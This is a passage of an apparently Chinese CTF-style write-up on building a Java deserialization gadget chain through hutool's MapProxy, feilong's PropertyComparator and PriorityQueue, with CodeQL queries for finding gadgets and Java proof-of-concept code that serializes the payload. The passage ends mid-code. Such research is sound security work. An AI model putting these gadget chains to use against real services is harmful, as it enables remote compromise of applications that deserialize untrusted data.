+                <span class="token punctuation">(</span>mc<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"cn.hutool.core.util"</span><span class="token punctuation">,</span> <span class="token string">"ReflectUtil"</span><span class="token punctuation">)</span> and mc<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"newInstance"</span><span class="token punctuation">)</span> 
+
+            <span class="token punctuation">)</span> and
+            <span class="token comment">// 排除特定包</span>
+            not mc<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPackage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"com.feilong.lib%"</span><span class="token punctuation">)</span>
+        <span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    predicate <span class="token function">isAdditionalFlowStep</span><span class="token punctuation">(</span><span class="token class-name">DataFlow</span><span class="token operator">::</span><span class="token class-name">Node</span> node1<span class="token punctuation">,</span> <span class="token class-name">DataFlow</span><span class="token operator">::</span><span class="token class-name">Node</span> node2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">//  方法内部调用链传播 </span>
+        <span class="token function">exists</span><span class="token punctuation">(</span><span class="token class-name">MethodCall</span> innerCall<span class="token punctuation">,</span> <span class="token class-name">Method</span> containingMethod <span class="token operator">|</span>
+            <span class="token comment">// innerCall是包含在某个方法内的调用</span>
+            innerCall<span class="token punctuation">.</span><span class="token function">getEnclosingCallable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> containingMethod and
+            <span class="token comment">// containingMethod是invoke方法</span>
+            containingMethod<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"invoke"</span> and
+            <span class="token comment">// 从invoke方法的参数到内部调用的参数</span>
+            <span class="token punctuation">(</span>
+                <span class="token punctuation">(</span>node1<span class="token punctuation">.</span><span class="token function">asParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> containingMethod<span class="token punctuation">.</span><span class="token function">getAParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
+                 node2<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> innerCall<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> or
+                <span class="token comment">// 或者从内部调用的结果到方法返回</span>
+                <span class="token punctuation">(</span>node1<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> innerCall and
+                 <span class="token function">exists</span><span class="token punctuation">(</span><span class="token class-name">ReturnStmt</span> rs <span class="token operator">|</span> rs<span class="token punctuation">.</span><span class="token function">getEnclosingCallable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> containingMethod and
+                                     node2<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">)</span>
+        <span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 配置数据流模块</span>
+<span class="token keyword">module</span> <span class="token class-name">InvokeToDeserializeFlow</span> <span class="token operator">=</span> <span class="token class-name">TaintTracking</span><span class="token operator">::</span><span class="token class-name">Global</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">InvokeToDeserializeFlowConfig</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token class-name">InvokeToDeserializeFlow</span><span class="token operator">::</span><span class="token class-name">PathGraph</span>
+
+<span class="token comment">// 查询语句</span>
+from <span class="token class-name">InvokeToDeserializeFlow</span><span class="token operator">::</span><span class="token class-name">PathNode</span> source<span class="token punctuation">,</span> <span class="token class-name">InvokeToDeserializeFlow</span><span class="token operator">::</span><span class="token class-name">PathNode</span> sink
+where <span class="token class-name">InvokeToDeserializeFlow</span><span class="token operator">::</span><span class="token function">flowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>
+select source<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"source to sink"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750750827530-e56648f3-4f4d-487b-819b-fb19cb67257c.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750750864738-2d6502d1-d591-46bc-9f77-118c6f7a8990.png"></p>
+<p>调用Convert.convert，参数可控，filename来自于methodname，从当前map中获取对应的值</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750751564912-a861ee75-7fe5-407a-be64-dcbe8ea03f2a.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750751613958-24501558-6e83-4d84-8f37-d73b4453b22c.png"></p>
+<p>一路调用到BeanConverter的convertInternal中转换为byte进行二次反序列化</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750751676310-68772870-171e-4ab2-bc46-4180ffe8e6c0.png"></p>
+<p>简单来说就是要在MapProxy中塞一个二次反序列化数据的byte，key为fieldname即可，接下来我们分析下fieldname怎么获取</p>
+<p>fieldname截取自调用的方法名，以get开头或者is开头，需要无参，并且其方法returnType不能为void</p>
+<p>我们可以去利用之前feilong中的PropertyComparator去触发getter，但是这里需要一个满足条件的getter</p>
+<ul>
+<li>get or is 开头</li>
+<li>无参方法</li>
+<li>returnType不能为void</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750752827441-79eb8814-e556-479c-a116-b9b77ad708f6.png"></p>
+<p>编写codeql查询</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java</span>
+
+from <span class="token class-name">Method</span> m<span class="token punctuation">,</span> <span class="token class-name">Interface</span> iface
+where
+  m<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> iface and
+  <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"get%"</span><span class="token punctuation">)</span> or m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"is%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> and
+  m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span> and
+  m<span class="token punctuation">.</span><span class="token function">hasNoParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
+  not m<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"void"</span><span class="token punctuation">)</span>
+select m<span class="token punctuation">,</span> iface<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750755546261-bf735ccc-1aa4-4a80-b344-daf476847981.png"></p>
+<p>有一堆啊，编写一下payload试试</p>
+<p>利用PriorityQueue去触发PropertyComparator.compare</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>app</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>captcha<span class="token punctuation">.</span></span><span class="token class-name">ICaptcha</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">MapProxy</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token class-name">Util</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>feilong<span class="token punctuation">.</span>core<span class="token punctuation">.</span>util<span class="token punctuation">.</span>comparator<span class="token punctuation">.</span></span><span class="token class-name">PropertyComparator</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">MapProxy</span> mapProxy1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MapProxy</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">ICaptcha</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ICaptcha</span><span class="token punctuation">)</span><span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ICaptcha</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">ICaptcha</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> mapProxy1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ICaptcha</span> o1 <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">ICaptcha</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ICaptcha</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">ICaptcha</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> mapProxy1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//</span>
+        <span class="token comment">//        //需要触发的getter  ICaptcha getCode 使用code</span>
+        <span class="token class-name">PropertyComparator</span> propertyComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PropertyComparator</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>propertyComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span><span class="token string">"size"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectsjdk <span class="token operator">=</span> <span class="token punctuation">&#123;</span>o<span class="token punctuation">,</span>o1<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span><span class="token string">"queue"</span><span class="token punctuation">,</span>objectsjdk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token class-name">String</span> serialize <span class="token operator">=</span> <span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750906540540-d5eadc48-cf8d-43cb-84a2-ef3931481012.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750906566105-ce0033a4-7362-4d68-bf1f-935962e070fb.png"></p>
+<p>即可控制Convert.convert的第二参数，继续向下调试</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750909116293-6c71e7f5-6ee1-47f6-96e9-01829065727f.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750908946547-69206d94-c63d-40c1-a015-637e3a23f75f.png"></p>
+<p>然后发现进入的不是BeanConverter<img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750908956582-9b5a3e58-2448-4d1a-8fc6-2f67cec56b48.png"></p>
+<p>查看了一下wp里的调用，走的是下面的BeanConverter.convert。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750909137341-c065d485-a85c-43c8-b4b8-98a709d7f35d.png"></p>
+<p>我燃尽了，这里我还真不知道怎么写codeql污点传播，但是这里的调用确实是对的,我们需要控制type类型让他进入下面的结构即可，想进入下面的逻辑，则要获取不到对应的convert</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750910157557-6efa7a23-5e7e-423b-bbdc-7b171908bf75.png"></p>
+<p>会根据我们传入的Class type去查找对应的convert，我们的目标BeanConvert并不在此，所以我们需要找一个ClassType不在其中的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750910193131-af6c24ae-ba1c-43a4-a258-db660b2e80e4.png"></p>
+<p>最后一层要是一个Bean</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750910570655-3453e557-a27d-44d8-a72b-fc089464f9e1.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750910516991-bf0ddfbb-31b8-4c7c-9010-952a4f65db13.png"></p>
+<p>要有setter或public field</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750910500570-d75feda9-7a02-4ba1-83ea-31c16290b34e.png"></p>
+<p>codeql去查找</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java</span>
+
+from <span class="token class-name">Method</span> m<span class="token punctuation">,</span> <span class="token class-name">Interface</span> iface
+where
+  <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> iface and
+  m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"get%"</span><span class="token punctuation">)</span> and
+  m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span> and
+  m<span class="token punctuation">.</span><span class="token function">hasNoParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
+  not m<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"void"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> and
+  <span class="token punctuation">(</span>
+    <span class="token comment">// 存在对应的setter方法</span>
+    <span class="token function">exists</span><span class="token punctuation">(</span><span class="token class-name">Method</span> setter <span class="token operator">|</span>
+      setter<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> iface and
+      setter<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span> m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">suffix</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> and
+      setter<span class="token punctuation">.</span><span class="token function">getNumberOfParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span> and
+      setter<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"void"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
+    or
+    <span class="token comment">// 存在对应的public字段</span>
+    <span class="token function">exists</span><span class="token punctuation">(</span><span class="token class-name">Class</span> impl<span class="token punctuation">,</span> <span class="token class-name">Field</span> field <span class="token operator">|</span>
+      impl<span class="token punctuation">.</span>getASupertype<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> iface and
+      field<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> impl and
+      field<span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
+      field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">suffix</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
+  <span class="token punctuation">)</span>
+select m<span class="token punctuation">,</span> iface<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750910949566-f3c2ea02-2e9e-4850-adb3-ff1ed2a3c7bb.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>app</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>captcha<span class="token punctuation">.</span></span><span class="token class-name">ICaptcha</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">AggregateAnnotation</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">MapProxy</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>db<span class="token punctuation">.</span>dialect<span class="token punctuation">.</span></span><span class="token class-name">Dialect</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token class-name">Util</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>feilong<span class="token punctuation">.</span>core<span class="token punctuation">.</span>util<span class="token punctuation">.</span>comparator<span class="token punctuation">.</span></span><span class="token class-name">PropertyComparator</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>feilong<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>digester3<span class="token punctuation">.</span></span><span class="token class-name">ObjectCreationFactory</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"wrapper"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">MapProxy</span> mapProxy1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MapProxy</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Dialect</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Dialect</span><span class="token punctuation">)</span><span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Dialect</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Dialect</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> mapProxy1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Dialect</span> o1 <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Dialect</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Dialect</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Dialect</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> mapProxy1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token comment">//        //需要触发的getter</span>
+        <span class="token class-name">PropertyComparator</span> propertyComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PropertyComparator</span><span class="token punctuation">(</span><span class="token string">"wrapper"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>propertyComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span><span class="token string">"size"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectsjdk <span class="token operator">=</span> <span class="token punctuation">&#123;</span>o<span class="token punctuation">,</span>o1<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span><span class="token string">"queue"</span><span class="token punctuation">,</span>objectsjdk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token class-name">String</span> serialize <span class="token operator">=</span> <span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
